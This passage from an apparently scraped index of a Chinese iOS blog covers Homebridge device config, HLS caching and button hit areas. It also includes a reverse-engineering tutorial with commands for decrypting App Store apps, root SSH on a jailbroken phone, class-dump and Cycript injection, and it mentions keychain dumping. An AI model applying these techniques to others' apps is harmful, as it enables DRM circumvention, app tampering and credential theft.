\"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"accessories\":[ { \"accessory\":\"XiaomiAirPurifier3\", \"name\":\"Xiaomi Air Purifier\", \"did\":\"\", \"ip\":\"\", \"token\":\"\", \"pm25_breakpoints\":[ 5, 12, 35, 55 ] } ]}accessories: 加入米家電風扇設定資訊，ip 帶入攝影機 ip、token 帶入前文教學教的 token、did 帶入 zdid 記得存檔！然後照 Homebridge 章節教的，啟動/重新啟動/掃描加入 Homebridge；就能在「家庭」APP 中看到攝影機的控制項目了。可控制項目：空氣清淨機開關、風力大小調整可查看項目：當前溫濕度4.米家 LED 智慧檯燈在 Terminal 下命令安裝 homebridge-yeelight-wifi 這個 homebridge 套件 (不加 sudo) ：npm install -g homebridge-yeelight-wifi參考前文的修改設定檔(config.json)教學，在檔案中加入 platforms 區塊(若已有則在區塊內「,」新增一個子區塊) ：{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"platforms\":[ { \"platform\":\"yeelight\", \"name\":\"Yeelight\" } ]}不用特別帶什麼參數進去！若要做更細節的設定可參考 官方文件 (如亮度/色溫…) 記得存檔！智慧檯燈還需改綁定到「 Yeelight 」APP，然後將「區域網路控制」打開才能給 Homebridge 控制。1.在 iPhone 上下載安裝「 Yeelight 」APPApp Store 搜尋「Yeelight」安裝安裝完打開 Yeelight APP -&gt; 「增加裝置」-&gt; 找到「米家檯燈」-&gt; 重新配對綁定最後一步記得打開「 區域網路控制 」 *如果不小心沒點到打開，可以在「裝置」頁 -&gt; 選檯燈裝置進入 -&gt; 點右下角「△」Tab -&gt; 點「局域網控制」進入設定 -&gt; 打開區域網路控制 吐槽一下這個真的有夠爛，米家本身的 APP 沒有此開關功能，一定要綁到 Yeelight APP，也不能解綁或重綁回米家…否則會失效。然後照 Homebridge 章節教的，啟動/重新啟動/掃描加入 Homebridge；就能在「家庭」APP 中看到攝影機的控制項目了。可控制項目：燈開關、色溫調整、亮度調整其他米家智慧家電 homebridge 套件：我最終的 config.json 長這樣：{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"accessories\":[ { \"accessory\":\"MijiaCamera\", \"name\":\"Mi Camera\", \"ip\":\"192.168.0.105\", \"token\":\"6d304e6867384b704b4f714d45314a34\" }, { \"accessory\":\"XiaomiAirPurifier3\", \"name\":\"Xiaomi Air Purifier\", \"did\":\"270033668\", \"ip\":\"192.168.0.108\", \"token\":\"5c3eeb03065fd8fc6ad10cae1f7cce7c\", \"pm25_breakpoints\":[ 5, 12, 35, 55 ] } ], \"platforms\":[ { \"platform\":\"MiFanPlatform\", \"deviceCfgs\":[ { \"type\":\"MiDCVariableFrequencyFan\", \"ip\":\"192.168.0.106\", \"token\":\"dd1b6f582ba6ce34f959bbbc1c1ca59f\", \"fanName\":\"room fan\", \"fanDisable\":false, \"temperatureName\":\"room temperature\", \"temperatureDisable\":true, \"humidityName\":\"room humidity\", \"humidityDisable\":true, \"buzzerSwitchName\":\"fan buzzer switch\", \"buzzerSwitchDisable\":true, \"ledBulbName\":\"fan led switch\", \"ledBulbDisable\":true } ] }, { \"platform\":\"yeelight\", \"name\":\"Yeelight\" } ]}給大家做參考！我有用到的米家家電如上教學，其他我沒有的就沒去試了，大家可以自己 上 npm 查詢（homebridge-plugin XXX英文名稱） ，然後照上面邏輯大同小異安裝、設定串接上去！這邊附上幾個我找到但沒試過的 homebridge 套件(不保證能用)： 小米空氣清淨機1代： homebridge-mi-air-purifier 米家智能插座系列： homebridge-mi-outlet 小米掃地機器人： homebridge-mi-robot_vacuum 米家智能網關： homebridge-mi-aqara小叮嚀 建議到路由器將所有米家家電設定為指定/保留 IP，否則 IP 位置可能會變動，要重新更改 config.json 設定。 如果發現步驟都對但就是串不起來出現錯誤或是在 HomeKit 上一直顯示「無回應」，可以重新嘗試看看；如果還是一樣可能代表套件已失效，要找其他的套件來串接了。(可查看 github issue) 功能失效、反應慢；這個也無解，可以發 issue 告知作者等作者更新，由於是開源專案，不可要求太多了! 綁定完每個家電，都可以啟動一次 Homebridge，再回到 iPhone 上看能不能運作，能的話可以再下「Controle」＋「C」終止；當全部家電都綁定好後，可重新啟動樹莓派，讓他在重啟後自己在後台啟動 homebridge 服務；這才是我們要的。結語另外可以在「設定」-&gt;「控制中心」-&gt;「自訂」中將「家庭」APP 拉上去就能在下拉控制中心中快速操作 HomeKit !全部串上 HomeKit 後只有一個字「爽」！開關的反應更快，只差我沒有家庭中樞沒辦法遠端控制而已，此篇進階 Homebridge 也到此結束，感謝閱讀。回到文章開頭，全都加入 HomeKit 後我們就可以無痛使用 iOS ≥ 13的捷徑自動化功能了。之後再想要來研究 homebridge 套件是怎麼做的？感覺很有趣呢！所以如果有 HomeBridge 套件不合你的操作需求、有套件壞了找不到替代的，就在等我去研究吧！Home assistant還有另一個智慧家庭的平台 Homeassistant 可以刷入樹莓派使用（ 但請注意：需要 2A 的電源才有辦法啟動 ）； Homeassistant 我也有灌來玩玩看，全 GUI 圖型操作，點一點就能串入家電；之後再來深入研究，感覺他等同於另一個米家平台而已，如果有很多不同廠商的 IOT 元件，更適合使用這個。參考資料 https://www.domoticz.cn/forum/viewtopic.php?t=52 https://or2.in/2017/07/02/Homekit-and-MiJia-with-pi/#3-%E5%8F%B7%E5%A4%96-%E5%BC%80%E5%90%AF%E5%8F%AF%E8%A7%86%E5%8C%96VNC延伸閱讀 小米智慧家居新添購（AI音箱、溫濕度感應器、體重計2、直流變頻電風扇） iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居（直接使用 iOS ≥ 13.1 內建的捷徑APP完成自動化操作） 米家 APP / 小愛音箱地區問題 智慧家居初體驗 — Apple HomeKit &amp; 小米米家 （米家智慧攝影機及米家智慧檯燈、Homekit設定教學）有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 7,365 Total Views Last Statistics Date: 2025-01-19 | 7,360 Views on Medium. " }, { "title": "iOS HLS Cache 實踐方法探究之旅", "url": "/posts/d796bf8e661e/", "categories": "ZRealm Dev.", "tags": "hls, ios, ios-app-development, cache, reverse-proxy", "date": "2020-04-09 01:12:17 +0800", "snippet": "iOS HLS Cache 實踐方法探究之旅使用 AVPlayer 播放 m3u8 串流影音檔時如何做到邊播放邊 Cache 的功能photo by Mihis Alex[2023/03/12] Update 下篇「 AVPlayer 實踐本地 Cache 功能大全 」教您實現 AVPlayer Caching我將之前的實作開源了，有需求的朋友可直接使用。 客製化 Cache 策略，可以...", "content": "iOS HLS Cache 實踐方法探究之旅使用 AVPlayer 播放 m3u8 串流影音檔時如何做到邊播放邊 Cache 的功能photo by Mihis Alex[2023/03/12] Update 下篇「 AVPlayer 實踐本地 Cache 功能大全 」教您實現 AVPlayer Caching我將之前的實作開源了，有需求的朋友可直接使用。 客製化 Cache 策略，可以用 PINCache or 其他… 外部只需呼叫 make AVAsset 工廠，帶入 URL，則 AVAsset 就能支援 Caching 使用 Combine 實現 Data Flow 策略 寫了一些測試關於HTTP Live Streaming (簡稱HLS) 是蘋果提出基於HTTP的串流媒體網絡傳輸協議。以播放音樂來說，非串流情況下我們使用 mp3 作為音樂檔，這個檔案有多大就要花多久時間全部下載下來才能播放；而 HLS 就是把一個檔案分割成多個小檔案，讀到哪播到哪，所以拿到第一個分割區塊就能開始播放，不用整個都下載完！.m3u8 檔就是紀錄這些分割的 .ts 小檔案的碼率、播放順序、時間 還有整個音訊的資訊，另外也可以做加解密保護、低延遲直播…等等.m3u8 檔範例(aviciiwakemeup.m3u8)：#EXTM3U#EXT-X-VERSION:3#EXT-X-ALLOW-CACHE:YES#EXT-X-TARGETDURATION:10#EXT-X-MEDIA-SEQUENCE:0#EXTINF:9.900411,aviciiwakemeup–00001.ts#EXTINF:9.900400,aviciiwakemeup–00002.ts#EXTINF:9.900411,aviciiwakemeup–00003.ts#EXTINF:9.900411,...#EXTINF:6.269389,aviciiwakemeup-00028.ts#EXT-X-ENDLIST*EXT-X-ALLOW-CACHE 已在 iOS≥ 8/Protocol Ver.7 deprecated ，有沒有這行都沒有用意義了。目標對於一個影音串流服務， Cache 非常之重要 ；因為每個音訊檔案小則 MB 大則幾 GB ，如果每次重播都要再從伺服器拉一次檔案，對 Server 的 Loading 來說非常吃力，而且流量都是 \\(\\) ，如果有個 Cache 層能為服務節省許多金錢，對使用者來說也不用浪費網路、浪費時間重新下載；是一個雙贏的機制 (但要記得設定上限/定時清除，避免把使用者的設備塞爆)。問題以往非串流時 mp3/mp4 沒什麼好處理的，就是在播放前先下載到設備上，下載完成才開始播放；反正不管怎樣都要載完才能播，那不如我們自己用 URLSession 下載完檔案後再餵 file:// 下載在本地的檔案路徑給 AVPlayer 做播放即可；或正規方式，使用 AVAssetResourceLoaderDelegate 在 Delegate 方法中對下載的資料進行 Cache 緩存。遇到串流想法其實也很直白，就是先讀 .m3u8 檔，然後在解析裡面的資訊，對每個 .ts 檔做 Cache 即可；但實作發現事情沒有這麼簡單，處理難度超乎我的想像，所以才會有此篇文章！播放部分我們一樣直接使用 iOS AVFoundation 的 AVPlayer，在操作上串流/非串流檔案沒有差異。Example:let url:URL = URL(string:\"https://zhgchg.li/aviciiwakemeup.m3u8\")var player: AVPlayer = AVPlayer(url: url)player.play()2021–01–05 更新：我們退而求其次退回去使用 mp3 檔，這樣就能直接使用 AVAssetResourceLoaderDelegate 進行實作，詳細實作可參考「 AVPlayer 邊播邊 Cache 實戰 」。實踐方案針對我們的目標能達成的幾個方案及實踐時遇到的問題。方案 1. AVAssetResourceLoaderDelegate ❌第一個想法就是，那我們就照 mp3/mp4 時的做法就好啦！一樣用 AVAssetResourceLoaderDelegate 在 Delegate 方法中緩存 .ts 檔案。不過很抱歉，此路不通，因為無法在 Delegate 中攔截到 .ts 檔案的下載請求資訊，可以在這則 問答 和 官方文件 上確切此事。AVAssetResourceLoaderDelegate 實作可參考「 AVPlayer 邊播邊 Cache 實戰 」。方案 2.1 URLProtocol 攔截請求 ❌URLProtocol 也是最近才學到的方法，所有基於 URL Loading System 的請求 (URLSession、Call API、下載圖片…) 都可以被我們攔截下來修改 Request、Response 然後再返回，一切就像沒發生一樣，偷偷來；關於 URLProtocol 可以參考 此篇文章 。應用此方法，我們打算攔截 AVFoundation AVPlayer 在要求 .m3u8 、 .ts 的請求時，攔截下來然後如果本地有 Cache 就直接返回 Cache Data，沒有則再真的再發 Request 出去；這樣也能達到我們的目標。一樣，很抱歉，此路也不通；因為 AVFoundation AVPlayer 的請求不是在 URL Loading System 上，我們無從攔截。*有一說是 模擬器上可以但實機上不行方案 2.2 暴力讓他能進 URLProtocol ❌根據 方案 2.1 腦洞大開的暴力法，如果我把請求網址換成一個自訂的 Scheme (EX: streetVoiceCache://)，因 AVFoundation 無法處理這個請求，所以會丟出來，這樣我們的 URLProtocol 就能攔截到，做我們想做的事。let url:URL = URL(string:\"streetVoiceCache://zhgchg.li/aviciiwakemeup.m3u8?originSchme=https\")var player: AVPlayer = AVPlayer(url: url)player.play()URLProtocol 會攔截到 streetVoiceCache://zhgchg.li/aviciiwakemeup.m3u8?originSchme=https ，這時我們只要幫他還原成原來的網址，然後發個 URLSession 去要資料就能在這邊自己做 Cache；m3u8 中的 .ts 檔案請求一樣也會被 URLProtocol 攔截到，一樣我們能在這自己做 Cache。一切看似都那麼完美，但當我興高采烈的 Build-Run 完 APP 後，蘋果直接搧了我一巴掌：Error: 12881 “CoreMediaErrorDomain custom url not redirect”他不吃我給 .ts 檔案 Request 的 Response Data，我只能用 urlProtocol:wasRedirectedTo 這個方法 redirectTo 原始 Https 請求才能正常播放，即使我把 .ts 檔案下載到本地然後 redirectTo 那個 file:// 檔案；他也不接受，查 官方論壇 得到答案就是不能這樣做； .m3u8 只能是來源於 Http/Https (所以即使你把整個 .m3u8 還有所有分割檔 .ts 都放在本地，有無法使用 file:// 給 AVPlayer播放)，另外 .ts 也不能使用 URLProtocol 自行給予 Data。fxxk…方案 2.2–2 同方案 2.2 但是搭配 方案 1 AVAssetResourceLoaderDelegate 來實現 ❌實作方式如方案 2.2 ，餵給 AVPlayer 自訂的 Scheme 讓他進 AVAssetResourceLoaderDelegate；然後我們在自己處理。同 2.2 結果：Error: 12881 “CoreMediaErrorDomain custom url not redirect”官方論壇 同樣的回答。可以拿來做解密處理(可以參考 此篇文章 或 此範例 )但還是無法實現 Cache 功能。方案 3. Reverse Proxy Server ⍻ (可行，但非完美)這個方法是在找如何處理 HLS Cache 時，最多人給的答案；就是在 APP 上起一個 HTTP Server 做 Reverse Proxy Server 服務。原理也很簡單，APP 上 On 一個 HTTP Server 假設是 8080 Port，網址就會是 http://127.0.0.1:8080/ ；然後我們可以對連進來的 Request 做處理，給出 Response。套用到我們的案例就是，把請求網址換成： http://127.0.0.1:8080/aviciiwakemeup.m3u8?origin=http://zhgchg.li/在 HTTP Server 的 Handler 上對 *.m3u8 攔截處理，這時有 Request 進來就會進到我們的 Handler 中，看我們想幹嘛就幹嘛，想 Response 什麼 Data 都是我們自己控制， .ts 檔同樣會進來；這邊就可以做我們想做的 Cache 機制。對 AVPlayer 來說就是個 http://.m3u8 的標準串流音訊檔，所以不會有任何問題。完整實作範例可參考：因為我也是參考此範例做的，所以 Local HTTP Server 的部分我也是使用 GCDWebServer ，另外還有更新的 Telegraph 可以使用。( CocoaHttpServer 太久沒更新就不推薦用了)看起來不錯！但有個問題：我們的服務是音樂串流而非影音播放平台，音樂串流很多時候使用者都是在背景執行音樂切換的；這時候 Local HTTP Server 還會在？？GCDWebServer 的說明是當進入背景時會自動斷線、回前景自動恢復，但可以透過設置參數 GCDWebServerOption_AutomaticallySuspendInBackground:false 不讓他有這個機制。但是實測如果一段時間沒有發送請求 Server 還是會斷線 (且狀態會是錯的，還是 isRunning) 感覺就是被系統砍了；深掘了 HTTP Server 的做法 後發現底層都是基於 socket，查了 官方對 socket 服務的文件 後，此缺陷是無法解決的，本來在背景下沒有新的連接時就會被系統暫停。*網路上有找到很繞的方法…就是發個長請求、或不斷發空的請求確保 Server 在背景不會被系統暫停掉。以上都是針對 APP 在背景的狀況，在前景時 Server 很穩，也不會因為閒置被暫停，沒這問題！是說畢竟是依賴在其他服務上，開發環境測試沒問題，實際應用也建議要接個 rollback 處理(AVPlayer.AVPlayerItemFailedToPlayToEndTimeErrorKey 通知)；否則有個萬一服務掛掉，使用者會卡死。所以說不完美啊…方案 4. 使用 HTTP Client 本身的 caching 機制 ❌我們的 .m3u8/.ts 檔的 Response Headers 都有給予 Cache-Control 、 Age 、 eTag … 這些 HTTP Client Cache 資訊；我們的網站 Cache 機制在 Chrome 上使用也完全沒問題，另外也在官方新的針對 Protocol Extension for Low-Latency HLS (低延遲HLS) 初步規格文件中提到 Cache 的地方也看到可以設定 cache-control headers 來做緩存。但實際 AVFoundation AVPlayer 並沒有任何 HTTP Client Caching 效果，此路也不通！單純癡人說夢。方案 5. 不使用 AVFoundation AVPlayer 播放音訊檔 ✔自己實現音訊檔解析、緩存、編碼、播放功能。太硬核了，需要很深的技術能力及大量時間；沒研究。附上一個網路開源播放器做參考： FreeStreamer ，真要選擇此方案不如站在巨人的肩膀上，直接用第三方套件了。方案 5–1. 不使用 HLS同方案 5 ， 太硬核了，需要很深的技術能力及大量時間；沒研究。方案 6. 將 .ts 分割檔轉成 .mp3/.mp4 檔案 ✔沒研究，但的確可行；不過想起來就覺得複雜，要處理已下載的 .ts 檔案，個別轉成 .mp3 或 .mp4 檔案然後照順序播放、或是壓縮成一個檔案什麼的，想起來就不太好做。有興趣可參考 此篇文章 。方案 7. 下載完整檔案後再播放 ⍻這個方法不能確切叫邊播邊 Cache，實際是載下整個音訊檔案的內容，然後才開始播放；如果是 .m3u8 如同方案 2.2 提到的，不能直接載下來放在本地播放。要實作的話要用到 iOS ≥ 10 的 API AVAssetDownloadTask.makeAssetDownloadTask ，實際會將 . m3u8 打包成 .movpkg 放在本地，供使用者播放。這邊比較像是做離線播放而非做 Cache 的功能。另外使用者也能從「設定」-&gt;「一般」-&gt;「iPhone 儲存空間」-&gt; APP 中查看、管理已下載打包的音訊檔案。下方 已下載的影片 部分詳細實作可參考此範例：結語以上的探索路程大概花了快一整週，繞來繞去、快要喪心病狂了；目前還沒有一個可靠的、容易部署的方法。如果有新的想法再來更新!參考資料 iOS音频播放 (九)：边播边缓存 StyleShare/HLSCachingReverseProxyServer有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 5,094 Total Views Last Statistics Date: 2025-01-19 | 4,931 Views on Medium. " }, { "title": "iOS 逆向工程初體驗", "url": "/posts/7498e1ff93ce/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, hacking, jailbreak, security", "date": "2020-03-28 18:24:40 +0800", "snippet": "iOS 逆向工程初體驗從越獄、提取iPA檔敲殼到UI分析注入及反編譯的探索過程關於安全之前唯一做過跟安全有關的就只有 &lt;&lt; 使用中間人攻擊嗅探傳輸資料 &gt;&gt; ；另外也接續這篇，假設我們在資料傳輸前編碼加密、接受時 APP 內解密，用以防止中間人嗅探；那還有可能被偷走資料嗎？ 答案是肯定的！，就算沒真的試驗過；世界上沒有破不了的系統，只有時間成本的問題，當破解耗費的時...", "content": "iOS 逆向工程初體驗從越獄、提取iPA檔敲殼到UI分析注入及反編譯的探索過程關於安全之前唯一做過跟安全有關的就只有 &lt;&lt; 使用中間人攻擊嗅探傳輸資料 &gt;&gt; ；另外也接續這篇，假設我們在資料傳輸前編碼加密、接受時 APP 內解密，用以防止中間人嗅探；那還有可能被偷走資料嗎？ 答案是肯定的！，就算沒真的試驗過；世界上沒有破不了的系統，只有時間成本的問題，當破解耗費的時間精力大於破解成果，那就可以稱為是安全的！How?都做到這樣了，那還能怎麼破？就是本篇想記錄的議題 — 「逆向工程 」 ，敲開你的 APP 研究你是怎麼做加解密的；其實一直以來對這個領域都是懵懵懂懂，只在 iPlayground 2019 上聽過兩堂大大的分享，大概知道原理還有怎麼實現，最近剛好有機會玩了一下跟大家分享！逆了向，能幹嘛？ 查看 APP UI 排版方式、結構 獲取 APP 資源目錄 .assets/.plist/icon… 竄改 APP 功能重新打包 (EX: 去廣告) 反編譯推測原始程式碼內容取得商業邏輯資訊 dump 出 .h 標頭檔 / keycahin 內容實現環境macOS 版本： 10.15.3 CatalinaiOS 版本： iPhone 6 (iOS 12.4.4 / 已越獄) *必要 Cydia: Open SSH越獄的部分任何版本的 iOS、iPhone 都可以，只要是能越獄的設備，建議使用舊的手機或是開發機，以避免不必要的風險；可根據自己的手機、iOS 版本參考 瘋先生越獄教學 ，必要時需要將 iOS 降版 （ 認證狀態查詢 ）再越獄。我是拿之前的舊手機 iPhone 6 來測試，原本已經升到 iOS 12.4.5 了，但發現 12.4.5 一直越獄不成功，所幸先降回 12.4.4 然後使用 checkra1n 越獄就成功了！步驟不多，也不難；只是需要時間等待！附上一個自己犯蠢的經驗： 下載完舊版 IPSW 檔案後，手機接上 Mac ，直接使用 Finder 檔案瀏覽器(macOS 10.5 後就沒有 iTunes 了)，在左方 Locations 選擇手機，出現手機資訊畫面後， 「Option」按著然後再點「Restore iPhone」 就能跳出 IPSW 檔案選擇視窗，選擇剛下載下來的舊版 IPSW 檔案就能完成刷機降版。 我本來傻傻的直接按 Restore iPhone…只會浪費時間重刷一次最新版而已….使用 lookin 工具查看別人的 APP UI 排版我們先來點有趣的前菜，使用工具搭配越獄手機查看別人APP 是怎麼排版。查看工具： 一是 老牌 Reveal (功能更完整，需付費約 $60 美金/可試用)，二是騰訊 QMUI Team 製作的 lookin 免費開源工具；這邊使用 lookin 作為示範，Reveal 大同小異。 若沒有越獄手機也沒關係，此工具主要是讓你用在開發中的專案上，查看 Debug 排版（取代 Xcode 陽春的 inspector） 平常開發也能用到 ！ 唯有要看別人的 APP 需要使用越獄手機。如果要看自己的專案…可以選擇使用 CocoaPods 安裝、 斷點插入 （僅支援模擬器）、 手動導入Framework 到專案 、 手動設置 ，四種方法。將專案 Build + Run 起來之後，就能 在 Lookin 工具上選擇 APP 畫面 -&gt; 查看排版結構 。如果要看別人的APP…Step 1. 在越獄手機上打開「 Cydia 」-&gt; 搜尋「 LookinLoader 」-&gt;「 安裝 」-&gt; 回到手機「 設定 」-&gt;「 Lookin 」-&gt;「 Enabled Applications 」-&gt; 啟用想要查看的 APP 。Step 2. 使用傳輸線 將手機連接至 Mac 電腦 -&gt; 打開想要查看的APP -&gt; 回到電腦， 在 Lookin 工具上選擇 APP 畫面 -&gt; 即可 查看排版結構 。Lookin 查看排版結構Facebook 登入畫面排版結構可在左側欄檢視 View Hierarchy、右側欄對選中的物件進行動態修改。原本的「建立新帳號」被我改成「哈哈哈」對物件的修改也會實時的顯示在手機 APP 上，如上圖。就如同網頁的「F12」開發者工具，所有的修改僅對 View 有效，不會影響實際的資料；主要是拿來 Debug ，當然也可以用來改值、截圖，然後騙朋友 ＸＤ使用 Reveal 工具查看 APP UI 排版結構雖然 Reveal 需要付費才能使用，但個人還是比較喜歡 Reveal；在結構顯示上資訊更詳細、右方資訊欄位幾乎等同於 XCode 開發環境，想做什麼即時調整都可以，另外也會提示 Constraint Error 對於 UI 排版修正非常有幫助！這兩個工具在日常開發自己的 APP 上都非常有幫助！ 了解完流程環境及有趣的部分之後，就讓我們進入正題吧！ *以下開始都需要越獄手機配合提取 APP .ipa 檔案 &amp; 砸殼所有從 App Store 安裝的 APP，其中的 .ipa 檔案都有 FairPlay DRM 保護 ，俗稱加殼保護/相反的去掉保護就叫「砸殼」，所以單純從 App Stroe 提取 .ipa 是沒有意義的，也用不了。*另一個工具 APP Configurator 2 只能提取有保護的檔案，沒意義就不再贅述，有興趣使用此工具的朋友可以 點此 查看教學。使用工具+越獄手機提取砸殼之後的原始 .ipa 檔案：關於工具部分起初我使用的是 Clutch ，但怎麼嘗試都出現 FAILED 查了下專案 issue，發現有很多人有同樣狀況，貌似此工具已經不能在 iOS ≥ 12 使用了、另外還有一個老牌工具 dumpdecrypted ，但我沒有研究。這邊使用 frida-ios-dump 這個 Python 工具進行動態砸殼，使用起來非常方便！首先我們先準備 Mac 上的環境： Mac 本身自帶 Python 2.7 版本，此工具支援 Python 2.X/3.X，所以不用在特別安裝 Python；但我是使用 Python 3.X 進行操作的，如果有遇到 Python 2.X 的問題，不妨嘗試 安裝使用 Python 3 吧！ 安裝 pip （ Python 的套件源管理器） 使用 pip 安裝 frida ：sudo pip install frida -upgrade -ignore-installed six (python 2.X)sudo pip3 install frida -upgrade -ignore-installed six (python 3.X) 在 Terminal 輸入 frida-ps 如果沒錯誤訊息代表安裝成功！ Clone AloneMonkey/frida-ios-dump 這個專案 進入專案，用文字編輯器打開 dump.py 檔案 確認 SSH 連線設定部分是否正確 (預設不用特別動)User = ‘root’Password = ‘alpine’Host = ‘localhost’Port = 2222越獄手機上的環境： 安裝 Open SSH ：Cydia → 搜尋 → Open SSH →安裝 安裝 Frida 源：Cydia → 來源 → 右上角「編輯」 → 左上角「加入」 → https://build.frida.re 安裝 Frida：Cydia → 搜尋 → Frida → 依照手機處理器版本安裝對應的工具（EX: 我是 iPhone 6 A11，所以是裝 Frida for pre-A12 devices 這個工具）環境都弄好之後，開工：1.將手機使用 USB 連接到電腦2.在 Mac 上打開一個 Terminal 輸入 iproxy 2222 22 ，啟動 Server。3.確保手機/電腦處於相同網路環境中(EX: 連同個WiFi)4.再打開一個 Terminal 輸入 ssh root@127.0.0.1，輸入 SSH 密碼(預設是 alpine )5.再打開一個 Terminal 進行敲殼命令操作，cd 到 clone 下來的 /frida-ios-dump 目錄下。輸入 dump.py -l 列出手機中已安裝/正在執行的 APP。6. 找到要敲殼導出的 APP 名稱 / Bundle ID，輸入：dump.py APP名稱或BundleID -o 輸出結果的路徑/輸出檔名.ipa這邊務必指定 輸出結果的路徑/檔名 ，因為預設輸出路徑會在 /opt/dump/frida-ios-dump/ 這邊不想把它搬到 /opt/dump 中，所以要指定輸出路徑避免權限錯誤。7. 輸出成功後就能取得已敲殼的 .ipa 檔案！ 手機必須在解鎖情況下才能使用工具 若出現連線錯誤、reset by peer…等原因，可嘗試拔掉重插 USB 連接、重開 iproxy。7.將 .ipa 檔直接重新命名成 .zip 檔，然後直接右鍵解壓縮檔會出現 /Payload/APP名稱.app有了原始 APP 檔後我們可以…1. 提取 APP 的資源目錄在 APP名稱.app 右鍵 → 「Show Package Contents」就能看到 APP 的資源目錄2. class-dump 出 APP .h頭文件訊息使用 class-dump 工具導出全 APP (包含 Framework) .h 頭文件訊息 (僅限 Objective-C，若專案為 Swift 則無效)nygard/class-dump 大大的工具我嘗試失敗，一直 failed；最後還是一樣使用 AloneMonkey / MonkeyDev 大大的工具集中改寫過的 class-dump 工具才成功。 直接從這裡 Download MonkeyDev/bin/class-dump 工具 打開 Terminal 直接使用：./class-dump -H APP路徑/APP名稱.app -o 匯出的目標路徑dump 成功之後就能獲取到整個 APP 的 .h 資訊。4. 最後也是最困難的 — 進行反編譯可以使用 IDA 和 Hopper 反編譯工具進行分析使用，兩款都是收費工具， Hopper 可免費試用(每次 30 分鐘)我們將取得的 APP名稱.app 檔案直接拉到 Hopper 即可開始進行分析。不過我也就止步於此了，因為從這開始就要研究機器碼、搭配 class-dump 結果推測方法…等等；需要非常深入的功力才行！突破反編譯後，可以自行竄改運作重新打包成新的 APP。圖片取自航海王逆向工程的其他工具1. 使用 MITM Proxy 免費工具嗅探 API 網路請求資訊 &gt;&gt;APP有用HTTPS傳輸，但資料還是被偷了。2.Cycript (搭配越獄手機) 動態分析/注入工具： 在越獄手機上打開「Cydia」-&gt; 搜尋「Cycript」-&gt;「安裝」 在電腦打開一個 Terminal 使用 Open SSH 連線至手機， ssh root@手機IP (預設是 alpine ) 打開目標 APP (APP 保持在前景) 在 Terminal 輸入 ps -e | grep APP Bundle ID 查找正在運行的 APP Process ID 使用 cycript -p Process ID 注入工具到正在運行的 APP可使用 Objective-c/Javascript 進行調試控制。For Example:cy# alert = [[UIAlertView alloc] initWithTitle:@\"HIHI\" message:@\"ZhgChg.li\" delegate:nil cancelButtonTitle:@\"Cancel\" otherButtonTitles:nl]cy# [alert show]注入一個 UIAlertViewController… chose( ) : 獲取目標 UIApp.keyWindow.recursiveDescription( ) .toString( ) : 顯示 view hierarchy 結構資訊 new Instance(記憶體位置): 獲取物件 exit(0) : 結束詳細操作可參考 此篇文章 。3. Lookin / Reveal 查看 UI 排版工具前面介紹過，再推一次；在自己的專案日常開發上也非常好用，建議購買使用 Reveal。4. MonkeyDev 集成工具 ，可透過動態注入竄改 APP 並重新打包成新的 APP5. ptoomey3 / Keychain-Dumper ，導出 KeyChain 內容詳細操作請參考 此篇文章 ，不過我沒試成功，看專案 issue 貌似也是在 iOS ≥ 12 之後就失效了。總結這個領域是個超級大坑，需要非常多的技術知識基礎才有可能精通；本篇文章只是粗淺了「體驗」了一下逆向工程是什麼感覺，如有不足敬請見諒！ 僅供學術研究，勿做壞壞的事 ；個人覺得整個流程工具玩下來蠻有趣的，也對 APP 安全更有點概念！有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 9,984 Total Views Last Statistics Date: 2025-01-19 | 9,728 Views on Medium. " }, { "title": "iOS 擴大按鈕點擊範圍", "url": "/posts/a8c2d7ed144b/", "categories": "ZRealm Dev.", "tags": "ios-app-development, swift, 顧小事成大事, uikit, ios", "date": "2020-02-01 21:45:49 +0800", "snippet": "iOS 擴大按鈕點擊範圍重寫 pointInside 擴大感應區域日常開發上經常遇到版面照著設計 UI 排好之後，畫面美美的，但是實際操作上按鈕的感應範圍太小，不容易準確點擊；尤其對手指粗的人極不友善。完成範例圖Before…關於這個問題當初沒特別深入研究，直接暴力蓋一個範圍更大的透明 UIButton 在原按鈕上，並使用這個透明的按鈕響應事件，做起來非常麻煩、元件一多也不好控制。後來改用排...", "content": "iOS 擴大按鈕點擊範圍重寫 pointInside 擴大感應區域日常開發上經常遇到版面照著設計 UI 排好之後，畫面美美的，但是實際操作上按鈕的感應範圍太小，不容易準確點擊；尤其對手指粗的人極不友善。完成範例圖Before…關於這個問題當初沒特別深入研究，直接暴力蓋一個範圍更大的透明 UIButton 在原按鈕上，並使用這個透明的按鈕響應事件，做起來非常麻煩、元件一多也不好控制。後來改用排版的方式解決，按鈕在排版時設定上下左右都對齊0 (或更低)，再控制 imageEdgeInsets 、 titleEdgeInsets 、 contentEdgeInsets 這三個內距參數，將 Icon/按鈕標題 推到 UI 設計的正確位置；但這個做法比較適合使用 Storyboard/xib 的專案，因為可以直接在 Interface Builder 去推排版；另外一個是設計出的 Icon 最好要是沒有劉間距的，不然會不好對位置，有時候可能就卡在那個 0.5 的距離，怎麼調都不對齊。After…正所謂見多識廣，最近接觸到新專案之後又學到了一小招；就是可以在 UIButton 的 pointInside 中加大事件響應範圍，預設是 UIButton 的 Bounds，我們可以在裡面延伸 Bounds 的大小使按鈕的可點擊區域更大！經過以上思路…我們可以：class MyButton: UIButton { var touchEdgeInsets:UIEdgeInsets? override open func point(inside point: CGPoint, with event: UIEvent?) -&gt; Bool { var frame = self.bounds if let touchEdgeInsets = self.touchEdgeInsets { frame = frame.inset(by: touchEdgeInsets) } return frame.contains(point); }}自訂一個 UIButton ，增加 touchEdgeInsets 這個 public property 存放要擴張的範圍 方便我們使用；接著複寫 pointInside 方法，實作上述的想法。使用：import UIKitclass MusicViewController: UIViewController { @IBOutlet weak var playerButton: MyButton! override func viewDidLoad() { super.viewDidLoad() playerButton.touchEdgeInsets = 